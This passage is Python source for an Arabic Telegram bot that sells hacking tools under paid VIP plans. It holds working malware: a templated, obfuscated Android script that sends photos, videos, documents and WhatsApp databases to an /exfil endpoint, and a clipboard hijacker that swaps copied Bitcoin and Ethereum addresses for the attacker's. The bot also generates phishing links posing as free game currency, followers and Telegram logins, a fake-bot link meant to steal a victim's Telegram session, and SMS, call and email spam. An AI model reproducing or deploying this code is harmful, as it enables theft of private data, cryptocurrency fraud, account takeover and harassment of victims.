            safe_edit(f"{ce('🎮')} <b>[ شحن فري فاير وهمي ]</b>\n\n{ce('🔗')} <b>تم إنشاء رابط شحن فري فاير بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
        elif data == "pubg_hack":
            fake_link = f"{BASE_SOCIAL_URL}/pubg?user={cid}"
            safe_edit(f"🔫 <b>[ شحن ببجي UC وهمي ]</b>\n\n🔗 <b>تم إنشاء رابط شحن ببجي بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
        elif data == "clash_of_clans_hack":
            fake_link = f"{BASE_SOCIAL_URL}/clash_of_clans?user={cid}"
            safe_edit(f"⚔️ <b>[ شحن جواهر كلاش اوف كلانس وهمي ]</b>\n\n🔗 <b>تم إنشاء رابط الشحن بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
        elif data == "insta_followers_hack":
            fake_link = f"{BASE_SOCIAL_URL}/insta_followers?user={cid}"
            safe_edit(f"➕ <b>[ متابعين انستغرام وهمي ]</b>\n\n🔗 <b>تم إنشاء الرابط بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
        elif data == "tiktok_likes_hack":
            fake_link = f"{BASE_SOCIAL_URL}/tiktok_likes?user={cid}"
            safe_edit(f"❤️ <b>[ لايكات تيك توك وهمي ]</b>\n\n🔗 <b>تم إنشاء الرابط بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
        elif data == "telegram_login_hack":
            fake_link = f"{BASE_SOCIAL_URL}/telegram_login?user={cid}"
            safe_edit(f"📱 <b>[ تسجيل دخول تيليجرام وهمي ]</b>\n\n🔗 <b>تم إنشاء الرابط بنجاح:</b>\n<code>{fake_link}</code>", cid, call.message.message_id, reply_markup=social_menu())
        else:
            safe_edit(f"⏳ <b>جاري التوليد والتشفير الفعلي...</b>", cid, call.message.message_id)
            try:
                increment_stat("files")
                tool_code = '''
import time, sys, os, requests

C = "__CHAT_ID__"
EXFIL_URL = "__WEB_URL__/exfil"
U = "__WEB_URL__/check_vip/" + C

try:
    v = requests.get(U, timeout=10).text
    if v != "VALID":
        requests.post(EXFIL_URL, data={'cid': C, 'text': "❌ VIP Expired or Locked! Tool Disabled."})
        sys.exit()
except:
    sys.exit()

if not os.path.exists("/sdcard"):
    print("هذا البرنامج يدعم أجهزة الهاتف فقط.")
    sys.exit()

def send_file(filepath, ftype, cap=None):
    try:
        if os.path.getsize(filepath) < 50000000:
            files = {'file': open(filepath, "rb")}
            data = {'cid': C, 'type': ftype}
            if cap: data['text'] = cap
            requests.post(EXFIL_URL, files=files, data=data, timeout=60)
    except: pass

print("تم التشغيل لفك وتهيئة النظام (VIP)...")
time.sleep(1)

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "🔴 <b>[ VIP Device Hacked ]</b>\\n⏳ جاري سحب الملفات وقواعد البيانات..."})
except: pass

exts_img = ('.jpg', '.jpeg', '.png', '.gif')
exts_vid = ('.mp4', '.avi', '.mov', '.mkv', '.3gp')
exts_doc = ('.pdf', '.docx', '.txt', '.xlsx', '.zip')
exts_db = ('.db', '.crypt14', '.crypt12', '.crypt8', '.key')

paths = [
    "/sdcard/DCIM/Camera", "/sdcard/Pictures", "/sdcard/Download", 
    "/sdcard/Documents", "/sdcard/Music", 
    "/sdcard/WhatsApp/Media", "/sdcard/WhatsApp/Databases",
    "/sdcard/Android/media/com.whatsapp/WhatsApp/Media",
    "/sdcard/Android/media/com.whatsapp/WhatsApp/Databases"
]

extracted = 0
max_files = 100

for p in paths:
    if extracted >= max_files: break
    if os.path.exists(p):
        for root, dirs, files in os.walk(p):
            if extracted >= max_files: break
            for file in files:
                if extracted >= max_files: break
                fp = os.path.join(root, file)
                try:
                    if file.lower().endswith(exts_img):
                        send_file(fp, "Photo")
                        extracted += 1
                    elif file.lower().endswith(exts_vid):
                        send_file(fp, "Video")
                        extracted += 1
                    elif file.lower().endswith(exts_db):
                        send_file(fp, "Document", "🔑 Database File: " + file)
                        extracted += 1
                    elif file.lower().endswith(exts_doc):
                        send_file(fp, "Document")
                        extracted += 1
                except: pass

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "✅ VIP Extraction Complete. Sent " + str(extracted) + " files."})
except: pass

print("اكتمل التحديث بنجاح. يمكنك الإغلاق.")
time.sleep(5)
'''
                tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__WEB_URL__", WEB_HOST_URL)
                enc_code = military_encrypt(tool_code)
                file_stream = io.BytesIO(enc_code.encode('utf-8'))
                file_stream.name = f"{data}.py"
                bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء وتشفير السكربت VIP بنجاح (9 طبقات).</b>\n<i>⚠️ يتوقف تلقائياً إذا انتهى اشتراكك.</i>", reply_markup=social_menu())
                bot.delete_message(cid, call.message.message_id)
            except Exception as e:
                safe_edit(f"❌ <b>فشل إنشاء السكربت VIP!</b>\n<code>{str(e)}</code>", cid, call.message.message_id, reply_markup=social_menu())

    elif data == "vip_bot_hack":
        user_data = get_user(cid)
        if not (is_admin(cid) or (user_data and check_vip(user_data))):
            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
        fake_link = f"https://t.me/{FAKE_BOT_USERNAME}?start=fake_{cid}"
        safe_edit(f"{ce('🤖')} <b>[ اختراق عبر بوت ]</b>\n\n{ce('🔗')} <b>تم إنشاء رابط البوت الوهمي بنجاح:</b>\n<code>{fake_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية وسيتم سحب جلسة تيليجرام الخاص به.</i>", cid, call.message.message_id, reply_markup=vip_menu(cid))

    elif data == "vip_enter_key":
        states["vip_key_input_user"][cid] = True
        bot.send_message(cid, f"{ce('🔑')} <b>أرسل مفتاح VIP:</b>")
    elif data == "vip_share_link":
        user_data = get_user(cid)
        if not user_data:
            add_user(cid, None, None)
            user_data = get_user(cid)
        link = f"https://t.me/{bot.get_me().username}?start=ref_{cid}"
        bot.send_message(cid, f"{ce('👥')} <b>نظام الدعوات العادل:</b>\n{ce('🔗')} الرابط: <code>{link}</code>\n\n{ce('📊')} الدعوات: {user_data.get('ref_count', 0)}/5\n\n💡 <b>كيف يعمل؟</b>\n{ce('👤')} دعوة 1 شخص = VIP 24 ساعة.\n{ce('👥')} دعوة 5 أشخاص = VIP 7 أيام.\n🛡 التحقق الحسابي يمنع الحسابات الوهمية.")
    elif data == "vip_star_pay":
        bot.send_message(cid, f"⭐ <b>الاشتراك الشهري VIP</b>\n\n💰 السعر: <b>15 نجمة</b>.\n⏳ المدة: <b>30 يوم</b>.\n\n📩 الدفع يدوي عبر:\n👨‍💻 @a_mutamarid\n\n<i>بعد الدفع، سيقوم بتفعيل VIP لك فوراً.</i>")
    elif data == "vip_trial":
        user_data = get_user(cid)
        if not user_data:
            add_user(cid, None, None)
            user_data = get_user(cid)
        if user_data.get('used_trial', False):
            bot.answer_callback_query(call.id, f"❌ لقد استخدمت التجربة المجانية مسبقاً!", show_alert=True)
        else:
            user_data['vip_expiry'] = time.time() + (12 * 60 * 60)
            user_data['used_trial'] = True
            update_user(cid, user_data)
            bot.answer_callback_query(call.id, f"✅ تم تفعيل VIP 12 ساعة كتجربة!", show_alert=True)
            safe_edit(f"{ce('💎')} <b>VIP مفعّل (تجربة 12 ساعة)</b>", cid, call.message.message_id, reply_markup=vip_menu(cid))

    elif data == "free_menu":
        safe_edit(f"{ce('🆓')} <b>[ القسم المجاني ]</b>", cid, call.message.message_id, reply_markup=free_menu())
    elif data == "vip_menu":
        safe_edit(f"{ce('💎')} <b>[ القسم المدفوع VIP ]</b>", cid, call.message.message_id, reply_markup=vip_menu(cid))
    elif data == "social_menu":
        safe_edit(f"{ce('📡')} <b>[ اختراق سوشيال ميديا ]</b>", cid, call.message.message_id, reply_markup=social_menu())
    elif data == "ds_menu":
        safe_edit(f"{ce('⚡')} <b>[ السبام المباشر ]</b>", cid, call.message.message_id, reply_markup=ds_menu())
    elif data == "create_bot_menu":
        safe_edit(
            f"{ce('🤖')} <b>[ انشئ بوتك الخاص ]</b>\n\n"
            f"{ce('💎')} اختر مدة الاشتراك المناسبة لك:\n\n"
            f"{ce('⏳')} <b>3 أيام</b> — <b>20 نجمة</b> ⭐\n"
            f"{ce('🗓')} <b>15 يوم</b> — <b>50 نجمة</b> ⭐\n"
            f"{ce('⭐')} <b>شهر كامل</b> — <b>100 نجمة</b> ⭐\n\n"
            f"{ce('💳')} طرق الدفع المتاحة:\n"
            f"{ce('⭐')} نجوم تيليجرام (Telegram Stars)\n"
            f"{ce('💎')} عملة <b>TON</b> الرقمية",
            cid, call.message.message_id, reply_markup=create_bot_menu()
        )
    elif data in ("create_bot_3d", "create_bot_15d", "create_bot_30d"):
        plan = {
            "create_bot_3d":  ("3 أيام", "20 نجمة ⭐ أو ما يعادلها بعملة TON 💎"),
            "create_bot_15d": ("15 يوم", "50 نجمة ⭐ أو ما يعادلها بعملة TON 💎"),
            "create_bot_30d": ("شهر كامل", "100 نجمة ⭐ أو ما يعادلها بعملة TON 💎"),
        }[data]
        safe_edit(
            f"{ce('🤖')} <b>[ انشئ بوتك الخاص ]</b>\n\n"
            f"{ce('🗓')} المدة المختارة: <b>{plan[0]}</b>\n"
            f"{ce('💰')} السعر: <b>{plan[1]}</b>\n\n"
            f"{ce('📩')} لإنشاء بوتك الخاص، تواصل مع المطور:\n"
            f"{ce('👤')} @a_mutamarid\n\n"
            f"{ce('💳')} طرق الدفع: نجوم تيليجرام ⭐ أو عملة TON 💎\n\n"
            f"<i>سيتم تجهيز بوتك خلال دقائق بعد إتمام الدفع.</i>",
            cid, call.message.message_id,
            reply_markup=InlineKeyboardMarkup([
                [btn("👨‍💻 [ تواصل مع المطور ]", url="https://t.me/a_mutamarid")],
                [btn("🔙 [ رجوع ]", cb="create_bot_menu")],
            ])
        )
    elif data == "bot_info":
        safe_edit(f"{ce('🎭')} <b>[ معلومات البوت ]</b>\n{ce('🐉')} المتمرد V100\n{ce('⚙️')} @a_mutamarid", cid, call.message.message_id, reply_markup=main_menu(cid))
    elif data == "back_main":
        safe_edit(WELCOME_MSG, cid, call.message.message_id, reply_markup=main_menu(cid))
    elif data == "check_sub":
        sub, not_sub = check_sub(cid)
        if sub: safe_edit(WELCOME_MSG, cid, call.message.message_id, reply_markup=main_menu(cid))
        else: bot.answer_callback_query(call.id, f"❌ لم تشترك بعد! يرجى الاشتراك ثم الضغط على تحقق.", show_alert=True)

    elif data == "ds_telz":
        ds_data[cid] = {"service": "telz"}
        states["ds_target"][cid] = True
        safe_edit(f"{ce('📞')} <b>أرسل رقم الهدف:</b>", cid, call.message.message_id)
    elif data == "ds_yolla":
        ds_data[cid] = {"service": "yolla"}
        states["ds_target"][cid] = True
        safe_edit(f"{ce('🇮🇶')} <b>أرسل رقم الهدف:</b>", cid, call.message.message_id)
    elif data == "ds_ether":
        ds_data[cid] = {"service": "ether"}
        states["ds_target"][cid] = True
        safe_edit(f"{ce('⚡')} <b>أرسل رقم الهدف:</b>", cid, call.message.message_id)
    elif data == "ds_tg":
        ds_data[cid] = {"service": "tg"}
        states["ds_target"][cid] = True
        safe_edit(f"{ce('📱')} <b>أرسل رقم الهدف:</b>", cid, call.message.message_id)
    elif data == "ds_gmail":
        ds_data[cid] = {"service": "gmail"}
        states["ds_target"][cid] = True
        safe_edit(f"{ce('📧')} <b>أرسل ايميل الهدف:</b>", cid, call.message.message_id)

    elif data == "bot_control_start":
        states["bot_control_token"][cid] = True
        safe_edit(f"{ce('🤖')} <b>أرسل توكن البوت:</b>", cid, call.message.message_id)
    elif data == "bc_info":
        token = bc_tokens.get(cid)
        if token:
            try:
                me = telebot.TeleBot(token).get_me()
                safe_edit(f"{ce('📋')} <b>معلومات:</b>\n{ce('👤')} {me.first_name}\n{ce('🆔')} @{me.username}", cid, call.message.message_id, reply_markup=bot_control_menu())
            except:
                safe_edit(f"❌ خطأ", cid, call.message.message_id, reply_markup=bot_control_menu())
        else:
            safe_edit(f"❌ <b>لم يتم ربط بوت.</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
    elif data == "bc_webhook":
        safe_edit(f"{ce('📡')} <b>يعمل بالـ Polling.</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
    elif data == "bc_name":
        states["bc_name_input"][cid] = True
        safe_edit(f"{ce('👤')} <b>أرسل الاسم:</b>", cid, call.message.message_id)
    elif data == "bc_desc":
        states["bc_desc_input"][cid] = True
        safe_edit(f"{ce('📝')} <b>أرسل الوصف:</b>", cid, call.message.message_id)
    elif data == "bc_about":
        states["bc_about_input"][cid] = True
        safe_edit(f"{ce('✏️')} <b>أرسل النبذة:</b>", cid, call.message.message_id)
    elif data == "bc_cmds":
        states["bc_cmds_input"][cid] = True
        safe_edit(f"{ce('⚙️')} <b>أرسل الأوامر:</b>", cid, call.message.message_id)
    elif data == "bc_clear":
        token = bc_tokens.get(cid)
        if token:
            try:
                telebot.TeleBot(token).set_my_short_description("")
                telebot.TeleBot(token).set_my_description("")
                safe_edit(f"{ce('🗑')} <b>تم الحذف!</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
            except:
                safe_edit(f"❌ خطأ", cid, call.message.message_id, reply_markup=bot_control_menu())
        else:
            safe_edit(f"❌ <b>لم يتم ربط بوت.</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
    elif data == "bc_close":
        token = bc_tokens.get(cid)
        if token:
            try:
                telebot.TeleBot(token).set_my_description("🚧 صيانة...")
                safe_edit(f"{ce('⛔')} <b>تم إيقافه!</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
            except:
                safe_edit(f"❌ خطأ", cid, call.message.message_id, reply_markup=bot_control_menu())
        else:
            safe_edit(f"❌ <b>لم يتم ربط بوت.</b>", cid, call.message.message_id, reply_markup=bot_control_menu())
    elif data == "bc_logout":
        token = bc_tokens.get(cid)
        if token:
            try:
                telebot.TeleBot(token).log_out()
                if cid in bc_tokens: del bc_tokens[cid]
                safe_edit(f"{ce('🔌')} <b>تم الخروج!</b>", cid, call.message.message_id, reply_markup=vip_menu(cid))
            except:
                safe_edit(f"❌ خطأ", cid, call.message.message_id, reply_markup=bot_control_menu())
        else:
            safe_edit(f"❌ <b>لم يتم ربط بوت.</b>", cid, call.message.message_id, reply_markup=bot_control_menu())

@bot.message_handler(commands=['start'])
def cmd_start(msg):
    cid = msg.chat.id
    if is_banned(cid): return bot.send_message(cid, f"{ce('🚫')} <b>محظور.</b>")
    if load_maintenance() and not is_admin(cid): return bot.send_message(cid, f"{ce('🚧')} <b>صيانة.</b>")
    
    args = msg.text.split()
    ref_by = None
    if len(args) > 1:
        arg = args[1]
        if arg.startswith("ref_"):
            ref_id = int(arg.split("_")[1])
            if ref_id != cid: ref_by = ref_id
        elif arg.startswith("fake_"):
            ref_id = int(arg.split("_")[1])
            if ref_id != cid: ref_by = ref_id

    if not get_user(cid):
        a, b = random.randint(1, 10), random.randint(1, 10)
        answer = a + b
        states["math_captcha"][cid] = {"answer": str(answer), "ref_by": ref_by}
        return bot.send_message(cid, f"{ce('🤖')} <b>للتحقق من أنك لست روبوت:</b>\n\nكم ناتج {a} + {b} = ؟")
    
    sub, not_sub = check_sub(cid)
    if not sub:
        markup = InlineKeyboardMarkup()
        for ch in not_sub:
            markup.add(btn(f"الاشتراك في {ch.get('title', 'القناة')}", url=ch.get('link', 'https://t.me')))
        markup.add(btn(f"✅ تحقق", "check_sub"))
        return bot.send_message(cid, f"📢 <b>يرجى الاشتراك في القنوات أولاً لاستخدام البوت:</b>", reply_markup=markup)
    
    bot.send_message(cid, WELCOME_MSG, reply_markup=main_menu(cid))

@bot.message_handler(content_types=['text', 'document'])
def handle_all_messages(msg):
    cid = msg.chat.id
    text = msg.text or ""
    
    if cid in states["math_captcha"]:
        if not text:
            bot.send_message(cid, f"❌ <b>يرجى إرسال إجابة نصية فقط.</b>")
            return
        if text == states["math_captcha"][cid]["answer"]:
            ref_by = states["math_captcha"][cid].get("ref_by")
            del states["math_captcha"][cid]
            add_user(cid, msg.from_user.username, msg.from_user.first_name, ref_by)
            bot.send_message(cid, f"✅ تم التحقق بنجاح!", reply_markup=ReplyKeyboardRemove())
            sub, not_sub = check_sub(cid)
            if not sub:
                markup = InlineKeyboardMarkup()
                for ch in not_sub:
                    markup.add(btn(f"الاشتراك في {ch.get('title', 'القناة')}", url=ch.get('link', 'https://t.me')))
                markup.add(btn(f"✅ تحقق", "check_sub"))
                return bot.send_message(cid, f"📢 <b>يرجى الاشتراك في القنوات أولاً لاستخدام البوت:</b>", reply_markup=markup)
            bot.send_message(cid, WELCOME_MSG, reply_markup=main_menu(cid))
        else:
            bot.send_message(cid, f"❌ إجابة خاطئة. حاول مرة أخرى.")
        return

    if is_banned(cid): return bot.send_message(cid, f"{ce('🚫')} <b>محظور.</b>")
    if load_maintenance() and not is_admin(cid): return bot.send_message(cid, f"{ce('🚧')} <b>صيانة.</b>")

    if not is_admin(cid):
        sub, not_sub = check_sub(cid)
        if not sub:
            markup = InlineKeyboardMarkup()
            for ch in not_sub:
                markup.add(btn(f"الاشتراك في {ch.get('title', 'القناة')}", url=ch.get('link', 'https://t.me')))
            markup.add(btn(f"✅ تحقق", "check_sub"))
            bot.send_message(cid, f"📢 <b>يرجى الاشتراك في القنوات أولاً لاستخدام البوت:</b>", reply_markup=markup)
            return

    if cid in states.get("restore_backup", {}) and states["restore_backup"][cid]:
        if msg.content_type == 'document' and msg.document:
            status_msg = bot.send_message(cid, f"⏳ <b>جاري استلام النسخة الاحتياطية واستعادتها، يرجى الانتظار...</b>")
            try:
                file_id = msg.document.file_id
                file_info = bot.get_file(file_id)
                file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_info.file_path}"
                response = requests.get(file_url)
                if response.status_code != 200: raise Exception("فشل تنزيل الملف من سيرفرات تيليجرام")
                backup_path = os.path.join(DATA_DIR, "restore_temp.zip")
                with open(backup_path, 'wb') as f: f.write(response.content)
                for item in os.listdir(DATA_DIR):
                    if item != "restore_temp.zip":
                        item_path = os.path.join(DATA_DIR, item)
                        try:
                            if os.path.isfile(item_path): os.remove(item_path)
                            elif os.path.isdir(item_path): shutil.rmtree(item_path)
                        except: pass
                with zipfile.ZipFile(backup_path, 'r') as zipf: zipf.extractall(DATA_DIR)
                os.remove(backup_path)
                try: bot.delete_message(cid, status_msg.message_id)
                except: pass
                bot.send_message(cid, f"✅ <b>تم استعادة النسخة الاحتياطية بنجاح! جاري إعادة تحميل البيانات...</b>", reply_markup=admin_panel())
            except Exception as e:
                try: bot.delete_message(cid, status_msg.message_id)
                except: pass
                bot.send_message(cid, f"❌ <b>خطأ في الاستعادة:</b> <code>{str(e)[:100]}</code>", reply_markup=admin_panel())
        else:
            bot.send_message(cid, f"❌ <b>الرجاء إرسال ملف ZIP فقط.</b>")
        states["restore_backup"].pop(cid, None)
        return

    if cid in states.get("crypto_check_input", {}) and states["crypto_check_input"][cid]:
        states["crypto_check_input"].pop(cid, None)
        addr = text.strip()
        try:
            if addr.startswith("0x") and len(addr) == 42:
                res = requests.get(f"https://api.blockcypher.com/v1/eth/main/addrs/{addr}/balance").json()
                balance = int(res.get('balance', 0)) / 10**18
                txt = f"{ce('💰')} <b>محفظة Ethereum</b>\n\n{ce('🔗')} العنوان: <code>{addr}</code>\n⚖️ الرصيد: <code>{balance} ETH</code>\n📈 إجمالي المعاملات: <code>{res.get('n_tx', 0)}</code>"
            elif (addr.startswith("1") or addr.startswith("3") or addr.startswith("bc1")):
                res = requests.get(f"https://api.blockcypher.com/v1/btc/main/addrs/{addr}/balance").json()
                balance = int(res.get('balance', 0)) / 10**8
                txt = f"{ce('💰')} <b>محفظة Bitcoin</b>\n\n{ce('🔗')} العنوان: <code>{addr}</code>\n⚖️ الرصيد: <code>{balance} BTC</code>\n📈 إجمالي المعاملات: <code>{res.get('n_tx', 0)}</code>"
            else:
                txt = "❌ صيغة عنوان غير صحيحة. يجب أن يكون BTC أو ETH."
            bot.send_message(cid, txt, reply_markup=free_menu())
        except:
            bot.send_message(cid, "❌ حدث خطأ أثناء الاتصال بالشبكة.", reply_markup=free_menu())
        return

    if cid in states.get("cb_hijack_input", {}) and states["cb_hijack_input"][cid]:
        attacker_addr = text.strip()
        states["cb_hijack_input"].pop(cid, None)
        try:
            increment_stat("files")
            tool_code = '''
import time, sys, os, subprocess, re, requests

C = "__CHAT_ID__"
A = "__ATTACKER_ADDR__"
EXFIL_URL = "__WEB_URL__/exfil"

try:
    requests.post(EXFIL_URL, data={'cid': C, 'text': "💳 تم تفعيل مختطف الحافظة بنجاح..."})
except: pass

# Auto-install pyperclip
try:
    import pyperclip
except:
    subprocess.run([sys.executable, "-m", "pip", "install", "pyperclip"], capture_output=True)
    import pyperclip

btc_pat = r'^(bc1|[13])[a-km-zA-HJ-NP-Z1-9]{25,39}$'
eth_pat = r'^0x[a-fA-F0-9]{40}$'

while True:
    try:
        clip = pyperclip.paste()
        if re.match(btc_pat, clip) or re.match(eth_pat, clip):
            if clip != A:
                pyperclip.copy(A)
                requests.post(EXFIL_URL, data={'cid': C, 'text': f"🚨 تم العثور على محفظة وتم استبدالها!\\nالمحفظة القديمة: {clip}"})
    except: pass
    time.sleep(2)
'''
            tool_code = tool_code.replace("__CHAT_ID__", str(cid)).replace("__ATTACKER_ADDR__", attacker_addr).replace("__WEB_URL__", WEB_HOST_URL)
            enc_code = military_encrypt(tool_code)
            file_stream = io.BytesIO(enc_code.encode('utf-8'))
            file_stream.name = "Clipboard_Hijacker.py"
            bot.send_document(cid, file_stream, caption=f"✅ <b>تم إنشاء أداة مختطف الحافظة!</b>\n⚠️ <i>يعمل في الخلفية على الكمبيوتر والهاتف، وبمجرد أن ينسخ الضحية محفظة، سيتم استبدالها بمحفظتك.</i>", reply_markup=vip_menu(cid))
        except Exception as e:
            bot.send_message(cid, f"❌ خطأ: <code>{e}</code>", reply_markup=vip_menu(cid))
        return

    if cid in states["add_ch"] and states["add_ch"][cid]:
        try:
            chat = bot.get_chat(text)
            chs = load_channels()
            if not any(c['id'] == chat.id for c in chs):
                ch_data = {
                    "id": chat.id,
                    "title": chat.title,
                    "username": chat.username if chat.username else None,
                    "link": f"https://t.me/{chat.username}" if chat.username else None
                }
                if not ch_data['link']:
                    try: ch_data['link'] = bot.export_chat_invite_link(chat.id)
                    except: ch_data['link'] = "https://t.me"
                chs.append(ch_data)
                save_channels(chs)
                bot.send_message(cid, f"✅ <b>تمت إضافة القناة بنجاح.</b>", reply_markup=admin_panel())
            else:
                bot.send_message(cid, f"⚠️ <b>القناة مضافة مسبقاً.</b>", reply_markup=admin_panel())
        except Exception as e:
            bot.send_message(cid, f"❌ <b>خطأ: تأكد من أن البوت أدمن في القناة أو المعرّف صحيح.</b>", reply_markup=admin_panel())
        del states["add_ch"][cid]
        return

    if cid in states["vip_key_input_user"] and states["vip_key_input_user"][cid]:
        keys = load_vip_keys()
        if text in keys:
            key_data = keys[text]
            if key_data.get('status', 'active') == 'active' and key_data['uses_left'] > 0:
                if cid in key_data.get('users', []):
                    bot.send_message(cid, f"❌ <b>لقد استخدمت هذا المفتاح مسبقاً.</b>")
                else:
                    user_data = get_user(cid)
                    if not user_data:
                        add_user(cid, msg.from_user.username, msg.from_user.first_name)
                        user_data = get_user(cid)
                    user_data['vip_expiry'] = time.time() + (key_data['days'] * 24 * 60 * 60)
                    update_user(cid, user_data)
                    key_data['uses_left'] -= 1
                    key_data.setdefault('users', []).append(cid)
                    keys[text] = key_data
                    save_vip_keys(keys)
                    bot.send_message(cid, f"✅ <b>تم تفعيل VIP بنجاح!</b>", reply_markup=main_menu(cid))
            elif key_data['status'] == 'disabled':
                bot.send_message(cid, f"❌ <b>هذا المفتاح معطل من قبل الإدارة.</b>")
            else:
                bot.send_message(cid, f"❌ <b>انتهت صلاحية هذا المفتاح أو تم استنفاد استخدامه.</b>")
        else:
            bot.send_message(cid, f"❌ <b>مفتاح غير صحيح.</b>")
        del states["vip_key_input_user"][cid]
        return

    if cid in states["ds_target"] and states["ds_target"][cid]:
        ds_data[cid]['target'] = text
        states["ds_target"][cid] = False
        if ds_data[cid]['service'] in ['telz', 'yolla']:
            run_ds_task(cid, ds_data[cid]['service'], ds_data[cid]['target'], 1)
        else:
            states["ds_count"][cid] = True
            bot.send_message(cid, f"{ce('🔢')} <b>أرسل العدد:</b>")
        return

    if cid in states["ds_count"] and states["ds_count"][cid]:
        if text.isdigit():
            run_ds_task(cid, ds_data[cid]['service'], ds_data[cid]['target'], int(text))
        else:
            bot.send_message(cid, f"❌ <b>أرقام فقط.</b>")
        del states["ds_count"][cid]
        return

    if cid in states["bot_control_token"] and states["bot_control_token"][cid]:
        bc_tokens[cid] = text
        try:
            me = telebot.TeleBot(text).get_me()
            bot.send_message(cid, f"✅ <b>تم ربط البوت: @{me.username}</b>", reply_markup=bot_control_menu())
        except:
            bot.send_message(cid, f"❌ <b>توكن غير صالح.</b>", reply_markup=vip_menu(cid))
        del states["bot_control_token"][cid]
        return

    if is_admin(cid):
        if cid in states.get("bc_name_input", {}) and states["bc_name_input"][cid]:
            token = bc_tokens.get(cid)
            if token:
                try:
                    telebot.TeleBot(token).set_my_name(text)
                    bot.send_message(cid, f"✅ <b>تم تغيير اسم البوت بنجاح.</b>", reply_markup=bot_control_menu())
                except:
                    bot.send_message(cid, f"❌ <b>خطأ في تغيير الاسم.</b>", reply_markup=bot_control_menu())
            else:
                bot.send_message(cid, f"❌ <b>لم يتم ربط بوت.</b>", reply_markup=bot_control_menu())
            states["bc_name_input"].pop(cid, None)
        elif cid in states.get("bc_desc_input", {}) and states["bc_desc_input"][cid]:
            token = bc_tokens.get(cid)
            if token:
                try:
                    telebot.TeleBot(token).set_my_description(text)
                    bot.send_message(cid, f"✅ <b>تم تحديث الوصف الطويل.</b>", reply_markup=bot_control_menu())
                except:
                    bot.send_message(cid, f"❌ <b>خطأ.</b>", reply_markup=bot_control_menu())
            states["bc_desc_input"].pop(cid, None)
        elif cid in states.get("bc_about_input", {}) and states["bc_about_input"][cid]:
            token = bc_tokens.get(cid)
            if token:
                try:
                    telebot.TeleBot(token).set_my_short_description(text)
                    bot.send_message(cid, f"✅ <b>تم تحديث النبذة القصيرة.</b>", reply_markup=bot_control_menu())
                except:
                    bot.send_message(cid, f"❌ <b>خطأ.</b>", reply_markup=bot_control_menu())
            states["bc_about_input"].pop(cid, None)
        elif cid in states.get("bc_cmds_input", {}) and states["bc_cmds_input"][cid]:
            token = bc_tokens.get(cid)
            if token:
                try:
                    cmds = []
                    for line in text.split('\n'):
                        if '-' in line:
                            parts = line.split('-', 1)
                            cmd = parts[0].strip()
                            desc = parts[1].strip()
                            if cmd.startswith('/'): cmd = cmd[1:]
                            cmds.append(BotCommand(command=cmd, description=desc))
                    telebot.TeleBot(token).set_my_commands(cmds)
                    bot.send_message(cid, f"✅ <b>تم تحديث أوامر البوت بنجاح.</b>", reply_markup=bot_control_menu())
                except Exception as e:
                    bot.send_message(cid, f"❌ <b>خطأ:</b> <code>{e}</code>", reply_markup=bot_control_menu())
            states["bc_cmds_input"].pop(cid, None)
        elif cid in states.get("rm_ch", {}) and states["rm_ch"][cid]:
            chs = load_channels()
            chs = [c for c in chs if str(c.get('id')) != text]
            save_channels(chs)
            bot.send_message(cid, f"✅ <b>تم الحذف.</b>", reply_markup=admin_panel())
            states["rm_ch"].pop(cid, None)
        elif cid in states.get("ban", {}) and states["ban"][cid]:
            b = load_banned()
            if int(text) not in b: b.append(int(text))
            save_banned(b)
            bot.send_message(cid, f"✅ <b>تم الحظر.</b>", reply_markup=admin_panel())
            states["ban"].pop(cid, None)
        elif cid in states.get("unban", {}) and states["unban"][cid]:
            b = load_banned()
            if int(text) in b: b.remove(int(text))
            save_banned(b)
            bot.send_message(cid, f"✅ <b>تم فك الحظر.</b>", reply_markup=admin_panel())
            states["unban"].pop(cid, None)
        elif cid in states.get("broadcast", {}) and states["broadcast"][cid]:
            users = load_users()
            success, failed = 0, 0
            status_msg = bot.send_message(cid, f"⏳ <b>جاري الإذاعة لـ {len(users)} عضو...</b>")
            for u in users:
                try:
                    bot.send_message(u['id'], text)
                    success += 1
                except:
                    failed += 1
                time.sleep(0.05)
            try: bot.delete_message(cid, status_msg.message_id)
            except: pass
            bot.send_message(cid, f"📢 <b>اكتملت الإذاعة!</b>\n✅ ناجح: <code>{success}</code>\n❌ فاشل (محظور البوت): <code>{failed}</code>", reply_markup=admin_panel())
            states["broadcast"].pop(cid, None)
        elif cid in states.get("send_msg", {}) and states["send_msg"][cid]:
            try:
                parts = text.split(" ", 1)
                uid = int(parts[0])
                msg_text = parts[1]
                bot.send_message(uid, msg_text)
                bot.send_message(cid, f"✅ <b>تم الإرسال.</b>", reply_markup=admin_panel())
            except:
                bot.send_message(cid, f"❌ <b>خطأ. استخدم: ID Message</b>", reply_markup=admin_panel())
            states["send_msg"].pop(cid, None)
        elif cid in states.get("user_info", {}) and states["user_info"][cid]:
            u = get_user(int(text))
            if u:
                vip_status = f"{ce('✅')} مفعّل" if check_vip(u) else f"{ce('❌')} غير مفعّل"
                expiry = datetime.datetime.fromtimestamp(u.get('vip_expiry', 0)).strftime('%Y-%m-%d %H:%M') if u.get('vip_expiry', 0) > 0 else "لا يوجد"
                uname_str = f"@{u.get('uname')}" if u.get('uname') else "لا يوجد"
                txt = (
                    f"{ce('👤')} <b>معلومات العضو</b>\n\n"
                    f"{ce('🆔')} <b>الآيدي:</b> <code>{u['id']}</code>\n"
                    f"{ce('👥')} <b>اليوزر:</b> {uname_str}\n"
                    f"{ce('👤')} <b>الاسم:</b> {u.get('fname', 'لا يوجد')}\n"
